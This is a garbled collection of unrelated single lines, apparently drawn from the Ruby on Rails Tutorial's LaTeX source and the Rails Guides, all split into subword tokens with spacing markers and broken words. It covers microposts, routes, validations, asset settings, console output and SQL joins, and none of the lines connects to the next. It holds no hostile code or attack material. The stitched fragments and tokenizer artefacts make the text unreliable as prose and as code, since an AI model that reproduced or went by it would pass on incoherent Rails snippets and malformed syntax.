▁At ▁this ▁point , ▁our ▁application --- with ▁an ▁important ▁c a ve at --- en force s ▁email ▁uniqueness , ▁and ▁our ▁test ▁suite ▁should ▁pass .
▁( Experience ▁shows ▁that ▁this ▁is ▁a ▁ w is e ▁practice ▖)
▁We ' ll ▁start ▁by ▁adding ▁a ▁few ▁microposts ▁with ▁different ▁ owner s ▁to ▁the ▁micropost ▁fixtures , ▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ micropost _ different _ owner } .
▁ { ▁ foo : ▁' bar ' ▁ }
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : new _ password _ reset }
▁We ▁too k ▁care ▁of ▁the ▁first ▁route ▁in ▁Section ~\ ref { sec : set ting _ the _ root _ route }, ▁and ▁we ' ll ▁have ▁implemented ▁all ▁but ▁the ▁last ▁one ▁by ▁the ▁end ▁of ▁this ▁chapter .
▁class ▁My Validator ▁< ▁ ActiveModel :: Validator
▁This ▁is ▁a ▁generally ▁good ▁practice , ▁as ▁it ▁open s ▁up ▁the ▁possibility ▁of ▁ manipulati n g ▁individual ▁microposts ▁at ▁a ▁future ▁date ▁( using ▁JavaScript , ▁for ▁example ) .
▁B row s ers ▁request ▁pages ▁from ▁Rails ▁by ▁making ▁a ▁request ▁for ▁a ▁URL ▁using ▁a ▁specific ▁HTTP ▁method , ▁such ▁as ▁` GET `, ▁` POST `, ▁` PATCH `, ▁` PUT ` ▁and ▁` DELETE ` ▖
▁(\ k ode { mv } ▁is ▁a ▁Unix ▁command ; ▁on ▁Windows ▁you ▁may ▁need ▁to ▁re name ▁the ▁file ▁using ▁the ▁file ▁browser ▁or ▁the ▁\ k ode { re name } ▁command ▖)
▁A ▁text ▁editor / command ▁line ▁development ▁environment ▖ ▁\ href { http :// railstutorial ▖ org / images / figures / edit or _ s hell - full ▖ png }{( full ▁size )}
▁@ msg ▁= ▁" N o ▁customer ▁found ▁for ▁this ▁order "
▁ Welcome ▁to ▁the ▁\ href { http :// ruby ▖ railstutorial ▖ org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } } .
▁It ' s ▁worth ▁noting ▁that ▁the ▁\ k ode { nil } ▁object ▁is ▁special , ▁in ▁that ▁it ▁is ▁the ▁\ emph { only } ▁Ruby ▁object ▁that ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁a part ▁from ▁\ k ode { false } ▁itself .
▁The ▁signup ▁view ▁with ▁partial .
▁( The ▁only ▁really ▁important ▁one ▁is ▁the ▁change ▁to ▁ strong ▁parameters ; ▁the ▁other s ▁are ▁all ▁relative ly ▁minor ▖)
▁At ▁this ▁point , ▁you ▁m ight ▁expect ▁application ▁code ▁as ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }, ▁and ▁it ' s ▁similar , ▁but ▁there ▁are ▁two ▁key ▁difference s .
▁" Symbol " ▁=> ▁" symbol ",
▁The ▁options ▁accepted ▁by ▁the ▁assets ▁cache ▁store ▁are ▁the ▁same ▁as ▁the ▁application ' s
▁Then ▁you ▁can ▁completely ▁change ▁what ╼ this ▁view ▁would ▁normal ly ▁output .
▁If ▁you ' ve ▁notice d ▁that ▁\ k ode { followed \_ id } ▁also ▁identifie s ▁a ▁user , ▁and ▁are ▁concern ed ▁about ▁the ▁as y m me tr ic ▁treat ment ▁of ▁followed ▁and ▁ follower , ▁you ' re ▁a head ▁of ▁the ▁g a me .
▁F ur the r more , ▁if ▁you ▁use ▁the ▁Rails ▁form ▁helpers ▁to ▁generate ▁your ▁forms , ▁when ╼ a ▁validation ▁error ▁occur s ▁on ▁a ▁field , ▁it ▁will ▁generate ▁an ▁extra ▁`< div >` ▁around ╼ the ▁entry .
▁C on s equ ent ly , ▁the ▁in n er ▁\ k ode { if } ▁ condition al ▁will ▁be ▁evaluated :
▁* ▁` initialize _ logger ` ▁Initialize s ▁the ▁ logger ▁( an ▁` ActiveSupport :: Logger ` ▁object ) ▁for ▁the ▁application ▁and ▁make s ▁it ▁ accessible ▁at ▁` Rails ▖ logger `, ▁provided ▁that ▁no ▁initializer ▁inserted ▁before ▁this ▁point ▁has ▁defined ▁` Rails ▖ logger ` .
▁ New s Mailer ▖ week ly ( user )▖ deliver _ now
▁Validat ing ▁the ▁uniqueness ▁of ▁email ▁addresses ▖
▁# ▁with ▁try
▁We ▁see ▁here ▁that ▁Ruby ▁uses ▁ s q u a re ▁bracket s ▁to ▁access ▁array ▁elements .
▁ INNER ▁JOIN ▁ guest s ▁ ON ▁ guest s ▖ comment _ id ▁= ▁comments ▖ id
▁* ▁` integration _ to ol ` ▁defines ▁which ▁integration ▁tool ▁to ▁use ▖
▁More over , ▁they ▁ s uffer ▁from ▁ ter r ible ▁duplication :
▁Ruby ▁has ▁a ▁large ▁number ▁of ▁methods ▁for ▁ manipulati n g ▁strings ▁of ▁characters .
▁The ▁`` forgot ▁password '' ▁form ▁for ▁an ▁invalid ▁email ▁address .
▁* ▁ Fi re ▁the ▁SQL ▁query ▁and ▁retrieve ▁the ▁corresponding ▁results ▁from ▁the ▁database .
▁@ customer ▖ destroy
▁# ▁P us h ▁Rack :: Bo un ce F a v icon ▁at ▁the ▁bottom
▁This ▁method ▁is ▁similar ▁in ▁purpose ▁to ▁` K ernel # Array `, ▁but ▁there ▁are ▁some ▁difference s :
▁The ▁option ▁`: child re n ` ▁allows ▁you ▁to ▁set ▁these ▁ n ode ▁names .
▁Do ub le - click ▁on ▁the ▁\ k ode { ▖ gitignore } ▁file ▁( Figure ~\ ref { fig : gitignore }) ▁to ▁open ▁it , ▁and ▁then ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : gitignore _ spring } .
▁ Example ▁object ▁structure ▁for ▁use ▁with ▁this ▁method :
▁\ emph { Hint : } ▁S e ar ch ▁the ▁web ; ▁you ▁should ▁find ▁one ▁particular ly ▁ r ob us t ▁method ▁in v ol v ing ▁something ▁called ▁\ k ode { \_ blank } .
▁The ▁\ k ode { create } ▁action ▁in ▁Listing ~\ ref { code : initial _ create _ session } ▁does ▁not h ing ▁but ▁render ▁the ▁\ k ode { new } ▁view , ▁but ▁it ' s ▁enough ▁to ▁get ▁us ▁started .
▁| ▁GET ▁| ▁ / sekret / comments / : id / edit (▖ : format ) ▁| ▁comments # edit ▁| ▁edit _ comment _ path ▁|
▁The ▁result ing ▁page ▁is ▁show n ▁in ▁Figure ~\ ref { fig : user _ show _ sidebar _ css } .
▁We ' ve ▁ s a id ▁before ▁that ▁everything ▁in ▁Ruby ▁is ▁an ▁object , ▁and ▁in ▁this ▁section ▁we ' ll ▁finally ▁get ▁to ▁define ▁some ▁of ▁our ▁own .
▁The ▁` assert _ routing ` ▁ assert ion ▁check s ▁the ▁route ▁both ▁ways : ▁it ▁tests ▁that ▁the ▁path ▁generates ▁the ▁options , ▁and ▁that ▁the ▁options ▁generate ▁the ▁path ▖
▁ puts ▁<< - U S A G E ▖ strip _ her e doc
▁c attr _ accessor ▁: emulate _ boolean s
▁We ▁can ▁add ▁a ▁secure ▁password ▁to ▁a ▁model ▁using ▁the ▁built - in ▁\ k ode { has \_ secure \_ password } ▁method .
▁Note ▁the ▁\ k ode { method : ▁: delete } ▁argument , ▁which ▁arrange s ▁for ▁the ▁link ▁to ▁issue ▁the ▁necessary ▁\ text tt { DELETE } ▁request ▖ ▁We ' ve ▁also ▁wrap ped ▁each ▁link ▁inside ▁an ~\ k ode { if } ▁statement ▁so ▁that ▁only ▁admin s ▁can ▁see ▁them .
▁@ order ▁= ▁@ customer ▖ orders ▖ create ( order _ date : ▁Time ▖ now )
▁scope ▁: published _ and _ comment ed , ▁-> ▁ { ▁ published ▖ where (" comments _ count ▁> ▁0 ") ▁ }
▁ ╼ ▁$ ▁p s ▁aux ▁| ▁ grep ▁ spring ╼ ▁ ubuntu ▁1 22 4 1 ▁0 ▖ 3 ▁ 0▖5 ▁ 58 99 60 ▁17 8 4 16 ▁?
▁Using ╼` JSON ▖ generate ` ▁and ▁` JSON ▖ dump ` ▁inside ▁a ▁Rails ▁application ▁could ▁produce ╼ un expect ed ▁errors .
▁ --- ----------------
▁These ▁actions ▁will ▁perform ▁ CRUD ▁operations ▁on ▁the ▁articles ╼ with in ▁our ▁system .
▁ Each ▁find er ▁method ▁allows ▁you ▁to ▁pass ▁arguments ▁into ▁it ▁to ▁perform ▁certain ▁queries ▁on ▁your ▁database ▁without ▁writing ▁raw ▁SQL .
▁The ▁format ▁for ▁this ╼ template ▁can ▁only ▁be ▁` html ` ▁and ▁the ▁handle r ▁must ▁be ▁one ▁of ▁` erb `, ▁` builder ` ▁or ╼` coffee ` ▖
▁Ou r ▁strategy ▁for ▁handling ▁account ▁activation ▁parallel s ▁user ▁login ▁\ line break ▁( Section ~\ ref { sec : logging _ in }) ▁and ▁es pecially ▁remember ing ▁users ▁( Section ~\ ref { sec : remember _ me }) .
▁In ▁some ▁applications , ▁this ▁initial ▁implementation ▁m ight ▁be ▁good ▁enough ▁for ▁most ▁practical ▁purposes .
▁P utting ▁the ▁variable ▁directly ▁into ▁the ▁conditions ▁string ▁will ▁pass ▁the ▁variable ▁to ▁the ▁database ▁** as - is ** ▖
▁2 ▁files ▁changed , ▁5 ▁insert ion s ( + ), ▁24 3 ▁deletion s ( - )
▁is ▁reference d ▁as :
▁The ▁Home ▁page ▁with ▁a ▁title .
▁In ▁this ▁section , ▁we ' ll ▁add ▁the ▁\ href { http :// www ▖ dictionary ▖ com / b row se / p en ultimate } { p en ultimate } ▁user ▁action , ▁the ▁\ k ode { index } ▁action , ▁which ▁is ▁design ed ▁to ▁display ▁\ emph { all } ▁the ▁users ▁instead ▁of ▁just ▁one .
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁photos # show ▁| ▁display ▁a ▁specific ▁ photo ▁|
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁user name , ▁we ▁open ▁the ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date ▁( Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }) .
▁By ▁default ▁the ▁asset ▁pipeline ▁will ▁check ▁for ▁ po t en tial ▁errors ▁in ▁development ▁mode ▁during ╼ run time ▖
▁To ▁keep ▁it ▁simple ▁in ▁this ▁case , ▁the ▁application ▁will ▁have ▁a ▁class ▁called ▁` User `╼ that ▁represent s ▁the ▁users ▁of ▁the ▁application ▁( we ' ll ▁get ▁into ▁making ▁this ╼ config ur able ▁further ▁on )▖
▁t ▖ text ▁: text
▁as ▁show n ▁in ▁Listing ~\ ref { code : new _ session _ tests } .
▁adapter : ▁ postgresql
▁* ▁` create !
▁The ▁sample ▁application ▁Home ▁page ▁with ▁debug ▁information .
▁But ▁then , ▁when ▁it ' s ▁time ▁to ▁send ▁a ▁response ▁back ▁to ▁the ▁user , ▁the ▁Controller ▁hand s ▁things ▁off ▁to ▁the ▁View ▖
▁< script ▁src ="/ assets / projects ▖ js ?
▁and ▁write ▁some ▁CoffeeScript ▁like ▁this :
▁[] ▖ from (0) ▁# ▁=> ▁[]
▁The ▁typical ▁first ▁step ▁when ▁making ▁a ▁web ▁application ▁is ▁to ▁create ▁a ▁\ emph { data ▁model }, ▁which ▁is ▁a ▁representation ▁of ▁the ▁structure s ▁needed ▁by ▁our ▁application .
▁As ▁noted ▁in ▁Table ~\ ref { table : shortcuts }, ▁you ▁can ▁even ▁leave ▁off ▁\ k ode { install }, ▁as ▁the ▁\ k ode { bundle } ▁command ▁by ▁itself ▁is ▁an ▁alias ▁for ▁\ k ode { bundle ▁install } .
▁ })
▁@ part ▖ assemblies ▁<< ▁@ assembly 1
▁A nother ▁way ▁to ▁do ▁this ▁is ▁using ▁` [ ] = ` ▁set ter
▁* ▁`: re strict _ with _ error ` ▁cause s ▁an ▁error ▁to ▁be ▁added ▁to ▁the ▁ owner ▁if ▁there ▁is ▁an ▁ associated ▁object
▁\ href { https :// p ragmatic s tudio ▖ com / ref s / railstutorial } { P ragmatic ▁S tudio } : ▁On line ▁Ruby ▁and ▁Rails ▁course s ▁from ▁M i k e ▁and ▁N ic o le ▁Clark .
▁The ▁point ▁of ▁the ▁\ k ode { home } ▁action , ▁as ▁we ▁saw ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁is ▁to ▁render ▁a ▁web ▁page , ▁not ▁to ▁return ▁a ▁value .
▁You ' ll ▁learn ▁more ▁about ▁ layouts ▁and ▁how ▁to ▁use ▁them ▁later ▁in ▁this ▁guide .
▁* ▁Note ▁that ▁` where (▖▖▖) ` ▁returns ▁a ▁relation , ▁not ▁an ▁array ▁like ▁the ▁old ▁find ers ▖
▁The ▁Micropost ▁data ▁model .
▁The ▁user ▁\ k ode { create } ▁action ▁with ▁a ▁save ▁and ▁a ▁redirect .
▁The ▁Micropost ▁migration .
▁For ▁example , ▁let ' s ▁define ▁a ▁function ▁\ k ode { string \_ message } ▁that ▁take s ▁a ▁single ▁\ emph { argument } ▁and ▁returns ▁a ▁message ▁base d ▁on ▁whether ▁the ▁argument ▁is ▁empty ▁or ▁not :
▁- 1 34 ▖ ordinal ▁# ▁=> ▁" th "
▁Pass ing ▁in ▁a ╼ symbol ▁( `: article ` ) ▁with ▁the ▁same ▁name ▁as ▁the ▁instance ▁variable ▁( `@ article ` )╼ also ▁ automagically ▁lead s ▁to ▁the ▁same ▁behavior ▖
▁### ▁ Helpers ▁Load ing ▁ Order
▁creates ▁a ▁\ text tt { f ound \_ user } ▁variable ▁who se ▁value ▁is ▁equal ▁to ▁the ▁result ▁of ▁\ text tt { find \_ by } .
▁ Writ ing ▁new ▁ Guardfile ▁to ▁ / Users / mhartl / rails _ projects / sample _ app / Guardfile
▁This ▁behavior ▁was ▁ never ▁intention ally ▁supported ▖
▁WARNING : ▁You ▁may ▁put ▁your ▁initializer ▁before ▁or ▁after ▁any ▁other ▁initializer ▁in ▁the ▁ chain , ▁as ▁long ▁as ▁it ▁is ▁ logical ▖
▁( This ▁is ▁our ▁first ▁example ▁of ▁the ▁not ion ▁of ▁\ emph { scope } .
▁ ╼ ▁x ▁= ▁x ▁+ ▁1 ▁-> ▁x ▁ += ▁1 ╼ ▁x ▁= ▁x ▁* ▁3 ▁-> ▁x ▁* = ▁3 ╼ ▁x ▁= ▁x ▁- ▁ 8 ▁-> ▁x ▁- = ▁ 8 ╼ ▁x ▁= ▁x ▁ / ▁2 ▁-> ▁x ▁ / = ▁2 ╼ ▁@ foo ▁= ▁@ foo ▁|| ▁" bar " ▁-> ▁@ foo ▁ ||= ▁" bar "
▁ / users /1
▁This ▁is ▁a ▁setting ▁for ▁Rails ▁itself ▖
▁remember _ token
▁One ▁common ▁question ▁is ▁how ▁much ▁background ▁is ▁necessary ▁to ▁learn ▁web ▁development ▁using ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } .
▁> > ▁Person ▖ create ▖ errors [: name ] ▖ any ?
▁* ▁his ▁or ▁ her ▖▖▖ ▁use ▁their .
▁[ ` button _ to ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / Url Helper ▖ html # method - i - button _ to ) ▁is ▁a ▁helper ▁that ▁help s ▁you ▁create ▁button s ▖
▁The ▁some what ▁ o d d ▁syntax
▁< td > <%= ▁c ▁%></ td >
▁=> ▁"2013-03-11 ▁00:57:46"
▁" About "
▁ Adding ▁ follower ▁ stats ▁to ▁the ▁Home ▁page .
▁#### ▁ Methods ▁Add ed ▁by ▁` belongs _ to `
▁Of ▁course , ▁to ▁get ▁the ▁partial ▁to ▁work , ▁we ▁have ▁to ▁create ▁the ▁corresponding ▁file ▁and ▁fill ▁it ▁with ▁some ▁content .
▁<%= ▁form _ for ▁@ user ▁do ▁| f | ▁%>
▁L a y out ▁declaration s ▁c ascad e ▁down ward ▁in ▁the ▁hierarchy , ▁and ▁more ▁specific ▁layout ▁declaration s ▁always ▁override ▁more ▁general ▁one s ▖
▁=> ▁#< User : 0 x 22 51 67 c ▁@ email =" mhartl @ example ▖ com ", ╼ @ name =" Michael ▁Hartl ">
▁Having ▁ finished ▁both ▁the ▁data ▁ modeling ▁and ▁display ▁templates ▁for ▁microposts , ▁we ▁now ▁turn ▁our ▁a tt en tion ▁to ▁the ▁interface ▁for ▁creating ▁them ▁through ▁the ▁web .
▁ Cl ic k ▁on ▁the ▁ ge ar ▁ icon ▁in ▁the ▁upper ▁right ▁part ▁of ▁the ▁file ▁navigation ▁pa ne ▁( Figure ~\ ref { fig : file _ navigator _ ge ar _ icon }) .
▁commit ▁d f 0 a 6 2 f 3 f 0 9 1 e 53 f fa 7 99 30 9 b 3 e 32 c 27 b 0 b 38 e b 4
▁A b s ol ute ▁ qualified ▁constant ▁names ▁like ▁`: : Math :: P I ` ▁raise ▁` NameError ` .
▁To ▁include ▁` app / assets / stylesheets / main ▖ css ` ▁and ▁` app / assets / stylesheets / photos / columns ▖ css `:
▁ CRUD ▁is ▁an ▁ acronym ▁for ▁the ▁four ▁verb s ▁we ▁use ▁to ▁operat e ▁on ▁data : ▁** C ** re ate ,╼ ** R ** e ad , ▁** U ** p date ▁and ▁** D ** e let e ▖
▁We ▁can ▁accomplish ▁this ▁by ▁following ▁the ▁pattern ▁in ▁Listing ~\ ref { code : pages _ routes }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : about _ route } .
▁Instead ▁of ▁open ing ▁a ▁new ▁pull ▁request ,╼ you ▁can ▁ force ▁push ▁to ▁your ▁branch ▁on ▁GitHub ▁as ▁describe d ▁earlier ▁in ╼ squash ing ▁commit s ▁section :
▁S e ar ch ed ▁in : ▁* ▁"/ path / to / blog / app / views "
▁The ▁results ▁of ▁expression s ▁follow ▁them ▁and ▁are ▁introduce d ▁by ▁" # ▁=> ▁" , ▁vertical ly ▁ al ig n ed :
▁By ▁passing ▁the ▁symbol ▁\ k ode { : user } ▁to ▁the ▁\ k ode { factory } ▁command , ▁we ▁tell ▁ Factory ▁Girl ▁that ▁the ▁subsequent ▁definition ▁is ▁for ▁a ▁User ▁model ▁object .
▁( As ▁we ' ll ▁see ▁in ▁a ▁moment , ▁there ▁will ▁be ▁one ▁extra ▁boolean ▁in ▁the ▁expression ▁above .
▁<%= ▁f ▖ submit ▁%>
▁The ▁field ▁name ▁can ▁also ▁be ▁a ▁string :
▁* ▁` ActionDispatch :: Callbacks ▖ before ` ▁take s ▁a ▁block ▁of ▁code ▁to ▁run ▁before ▁the ▁request .
▁These ▁files ▁are ▁used ▁by ▁the ▁Bundler ▁gem ▖
▁ Previous ly , ▁Rails ▁allow ed ▁ inline ▁callback ▁blocks ▁to ▁use ▁` return ` ▁this ▁way :
▁Because ▁its ▁use ▁is ▁ ub i q u it ous , ▁you ▁should ▁install ▁Git ▁even ▁at ▁this ▁ early ▁stage ; ▁I ▁suggest ▁following ▁the ▁installation ▁instructions ▁for ▁your ▁platform ▁at ▁the ▁\ href { http :// www ▖ git - s cm ▖ com / book / en / Getting - S t ar ted - Installing - Git } { Installing ▁Git ▁section ▁of ▁\ emph { Pro ▁Git } } .
▁Using ▁` scope `, ▁we ▁can ▁alter ▁path ▁names ▁generated ▁by ▁resources :
▁Because ▁the ▁\ emph { Rails ▁Tutorial } ▁cover s ▁testing ▁of ▁Rails ▁applications , ▁it ▁is ▁often ▁helpful ▁to ▁know ▁if ▁a ▁particular ▁piece ▁of ▁code ▁cause s ▁the ▁test ▁suite ▁to ▁fail ▁( in d icated ▁by ▁the ▁ color ▁red ) ▁or ▁pass ▁( in d icated ▁by ▁the ▁ color ▁green ) .
▁Then ▁we ▁can ▁make ▁the ▁corresponding ▁replace ment s ▁for ▁the ▁Help ▁and ▁About ▁pages ▁( Listing ~\ ref { code : help _ view _ erb _ title } ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title }) .
▁Testing ▁that ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁are ▁ protected ▖
▁( This ▁will ▁require ▁a ▁modification ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁defined ▁in ▁Listing ~\ ref { code : authenticated _ p } ▖)
▁The ▁c um ul a tive ▁effect ▁will ▁be ▁a ▁ deep er , ▁more ▁flexible ▁ knowledg e ▁of ▁Rails , ▁giv ing ▁you ▁a ▁good ▁background ▁for ▁writing ▁ nearly ▁any ▁type ▁of ▁web ▁application .
▁With ▁the ▁introduction ▁of ╼ Active ▁Job ▁and ▁` # deliver _ later `, ▁this ▁is ▁no ▁longer ▁true ▖
▁ ╼ * = ▁require _ self
▁Rails ▖ application ▖ config ▖ assets ▖ precompile ▁ += ▁[ ' admin ▖ js ', ▁' admin ▖ css ', ▁' s w f Object ▖ js ']
▁( If ▁it ▁doesn ' t ▁look ▁like ▁Listing ~\ ref { code : bitbucket _ add _ push }, ▁it ▁m ight ▁be ▁because ▁the ▁public ▁key ▁did n ' t ▁get ▁added ▁correctly , ▁in ▁which ▁case ▁I ▁suggest ▁try ing ▁that ▁step ▁again ▖)
▁As ▁indicate d ▁by ▁the ▁comment ▁in ▁the ▁\ k ode { setup } ▁method , ▁the ▁code ▁to ▁create ▁the ▁micropost ▁is ▁not ▁ idiomatic ally ▁correct , ▁which ▁we ' ll ▁fix ▁in ▁Section ~\ ref { sec : user _ micropost _ associations } .
▁When ▁a ▁file ▁is ▁reference d ▁from ▁a ▁manifest ▁or ▁a ▁helper , ▁Sprockets ▁search es ▁the ╼ th re e ▁default ▁asset ▁location s ▁for ▁it .
▁* ▁How ▁to ▁use ▁ eager ▁loading ▁to ▁reduce ▁the ▁number ▁of ▁database ▁queries ▁needed ▁for ▁data ▁re t ri eval .
▁In ▁database ▁terms , ▁this ▁associate s ▁two ▁classes ▁via ▁an ▁inter media te ▁join ▁table ▁that ▁includes ▁foreign ▁keys ▁refer r ing ▁to ▁each ▁of ▁the ▁classes .
▁Let ' s ▁fire ▁up ▁the ▁console , ▁\ k ode { require } ▁the ▁example ▁user ▁code , ▁and ▁take ▁our ▁User ▁class ▁out ▁for ▁a ▁ s p in :
▁Load ing ▁test ▁environment
▁If ▁you ▁look ▁at ▁the ▁response ▁for ▁this ▁using ▁c URL , ▁you ▁will ▁see ▁the ▁following :
▁( If ▁you ' re ▁using ▁Guard ▁as ▁describe d ▁in ▁Section ~\ ref { sec : guard }, ▁you ▁may ▁need ▁to ▁restart ▁that ▁as ▁well , ▁and ▁it ▁may ▁even ▁be ▁necessary ▁to ▁ ex it ▁the ▁terminal ▁ s hell ▁and ▁re - run ▁Guard ▁in ▁a ▁new ▁one ▖)
▁* ▁How ▁to ▁ clone ▁master ▁and ▁run ▁the ▁test ▁suite .
▁</ nav >
▁This ▁means ▁that ▁every ▁valid ▁CSS ▁file ▁is ▁also ▁a ▁valid ▁ SCSS ▁file , ▁which ▁is ▁convenient ▁for ▁ projects ▁with ▁existing ▁style ▁rules .
▁To ▁test ▁the ▁remember ▁token , ▁we ▁first ▁save ▁the ▁test ▁user ▁( the re by ▁creating ▁it , ▁since ▁it ▁has ▁ never ▁been ▁saved ), ▁and ▁then ▁check ▁that ▁the ▁user ' s ▁\ k ode { remember \_ token } ▁attribute ▁isn ' t ▁blank .
▁In ▁contrast , ▁the ▁whole ▁point ▁of ▁calculat ing ▁a ▁password ' s ▁hash ▁digest ▁is ▁to ▁be ▁\ emph { ir reversible }, ▁so ▁that ▁it ▁is ▁ com put ation ally ▁in tr ac table ▁to ▁infer ▁the ▁original ▁password ▁from ▁the ▁digest ▖ ▁(
▁$ ▁bin / rails ▁g ▁controller ▁comments
▁create ▁app / views / user _ mailer
▁The ▁first ▁part ▁identifie s ▁what ▁template ▁is ▁missing ▖
▁before _ action ▁: set _ expert _ locale
▁# ▁Return s ▁true ▁if ▁a ▁password ▁reset ▁has ▁ expired .
▁What ▁can ▁you ▁do ▁for ▁these ?
▁This ▁is ▁exactly ▁the ▁problem ▁solve d ▁by ▁\ emph { Ajax }, ▁which ▁allows ▁web ▁pages ▁to ▁send ▁requests ▁a synchronous ly ▁to ▁the ▁server ▁without ▁leav ing ▁the ▁page
▁* ▁` proxy _ association ▖ reflection ` ▁returns ▁the ▁ reflection ▁object ▁that ▁describe s ▁the ▁association .
▁* ▁Set s ▁up ▁the ▁flash ▁keys ▖
▁class ▁S end We e k ly S um m ary
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁id : ▁ / [ A - Z ] \ d { 5 } /
▁### ▁Create
▁You ▁could ▁specify ▁` A S C ` ▁or ▁` D E S C ` ▁as ▁well :
▁You ▁should ▁also ▁restart ▁the ▁web ▁server ▁to ▁ensure ▁that ▁the ▁new ▁gems ▁are ▁loaded ▁properly .
▁"2013-03- 06 ▁02:37:37" , ▁updated _ at : ▁"2013-03- 06 ▁02:37:37" > , ▁#< Micropost ▁id : ▁2,
▁* ▁Add s ▁ ETag ▁header ▁on ▁all ▁ String ▁ bo d ies ▖
▁# ▁it ▁is ▁equivalent ▁to ▁< tt > collection ▖ size ▖ zero ? </ tt > ▖ ▁If ▁the
▁* ▁` config ▖ active _ record ▖ main tain _ test _ schema ` ▁is ▁a ▁boolean ▁value ▁which ▁control s ▁whether ▁Active ▁Record ▁should ▁try ▁to ▁keep ▁your ▁test ▁database ▁ schema ▁up - to - date ▁with ▁` db / schema ▖ rb ` ▁( or ▁` db / structure ▖ sql ` ) ▁when ▁you ▁run ▁your ▁tests ▖
▁<% ▁end ▁%>
▁The ▁ answer ▁is ▁that ▁Ruby ▁doesn ' t ▁distinguish ▁between ▁new lines ▁and ▁other ▁whitespace ▁in ▁this ▁context
▁S ince ▁we ▁can ' t ▁allow ▁just ▁any ▁user ▁to ▁have ▁such ▁d angerous ▁power s , ▁we ' ll ▁take ▁care ▁to ▁create ▁a ▁privilege d ▁class ▁of ▁ administrative ▁users ▁ authorize d ▁to ▁delete ▁other ▁users .
▁A nother ▁example ▁is ▁this ▁code ▁from ▁` ActiveRecord :: Connection Adapters :: Abstract A d a p ter ` ▁where ▁`@ logger ` ▁could ▁be ▁` nil ` ▖
▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App ▁|
▁B la n k ▁lines ▁should ▁not ▁have ▁any ▁spaces .
▁ CRUD : ▁Read ing ▁and ▁ Writ ing ▁ Data
▁* ▁` association = ( associate ) `
▁All ▁un save d ▁ member s ▁of ▁the ▁association ▁will ▁automatically ▁be ▁saved ▁when ▁the ▁ parent ▁is ▁saved .
▁The ▁users ▁index ▁with ▁pagination .
▁Person ▖ create ( name : ▁" John ▁Doe ")▖ valid ?
▁* ▁Re p la ce s ▁ underscore s ▁with ▁spaces , ▁if ▁any .
▁A ▁ filled - in ▁form ▁with ▁\ k ode { text } ▁and ▁\ k ode { password } ▁fields ▖ ~\ href { http :// railstutorial ▖ org / images / figures / filled _ in _ form _ bootstrap - full ▖ png }{( full ▁size )}
▁Rails ▁also ▁has ▁built - in ▁support ▁for ▁convert ing ▁objects ▁to ▁ XML ▁and ▁rendering ▁that ▁ XML ▁back ▁to ▁the ▁call er :
▁* ▁If ▁` since ` ▁or ▁` ago ` ▁jump ▁to ▁a ▁time ▁that ▁can ' t ▁be ▁express ed ▁with ▁` Time ` ▁a ▁` DateTime ` ▁object ▁is ▁returned ▁instead .
▁=> ▁[" A ", ▁" B ", ▁" C "]
▁from ▁Listing ~\ ref { code : micropost _ instance _ variable } ▁to
▁This ▁arrange s ▁both ▁for ▁a ▁valid ▁page ▁at ▁\ k ode { / help } ▁( respond ing ▁to ▁\ text tt { GET } ▁requests ) ▁and ▁a ▁named ▁route ▁called ▁\ k ode { help \_ path } ▁that ▁returns ▁the ▁path ▁to ▁that ▁page .
▁Let ' s ▁take ▁a ▁moment ▁to ▁discuss ▁its ▁structure .
▁With ▁the ▁addition ▁of ▁the ▁Microposts ▁resource , ▁we ▁are ▁ nearly ▁ finished ▁with ▁our ▁sample ▁application .
▁We ▁next ▁define ▁the ▁form ▁for ▁creating ▁microposts ▁( Listing ~\ ref { code : micropost _ form }), ▁which ▁is ▁similar ▁to ▁the ▁signup ▁form ▁in ▁Listing ~\ ref { code : signup _ form } .
▁hash ▁# ▁=> ▁ { : b =>2}
▁A ▁program ▁for ▁ generating ▁code , ▁open ing ▁console ▁sessions , ▁or ▁starting ▁a ▁local ▁server
▁self ▖ include _ root _ in _ json ▁= ▁false
▁layout ▁" special "
▁You ▁will ▁need ▁to ▁include ▁the ▁` ActionView :: Record I d ent if i er ` ▁module ▁in ▁controllers ▁ requiring ▁this ▁feature .
▁Tests ▁for ▁the ▁\ k ode { full \_ title } ▁helper .
▁| ▁test / controllers / comments _ controller _ test ▖ rb ▁| ▁The ▁test ▁for ▁the ▁controller ▁|
▁A lthough ▁the ▁view ▁will ▁exist ▁as ▁a ▁single ▁page ▁of ▁code , ▁each ▁profile ▁will ▁be ▁customize d ▁using ▁information ▁retrieved ▁from ▁the ▁application ' s ▁database .
▁Note ▁that ▁Listing ~\ ref { code : user _ signup _ with _ account _ activation } ▁has ▁changed ▁the ▁redirect ▁behavior ▁upon ▁ signing ▁up .
▁ Write ▁tests ▁for ▁the ▁ stats ▁on ▁the ▁Home ▁and ▁profile ▁pages .
▁destroy
▁# ▁< foo ▁type =" integer "> 1 </ foo >
▁S ince ▁the ▁delete ▁links ▁appear ▁on ▁the ▁users ▁index , ▁we ' ll ▁add ▁these ▁tests ▁to ▁the ▁users ▁index ▁test ▁from ▁Listing ~\ ref { code : user _ index _ test } .
▁( We ' ll ▁discuss ▁\ k ode { private } ▁in ▁more ▁detail ▁in ▁Section ~\ ref { sec : remember _ me } ▖)
▁in ▁Listing ~\ ref { code : user _ edit _ view } .
▁* ▁`: in ` ▁( or ▁`: with in ` ) ▁- ▁The ▁attribute ▁length ▁must ▁be ▁included ▁in ▁a ▁given ╼ ▁inter val ▖
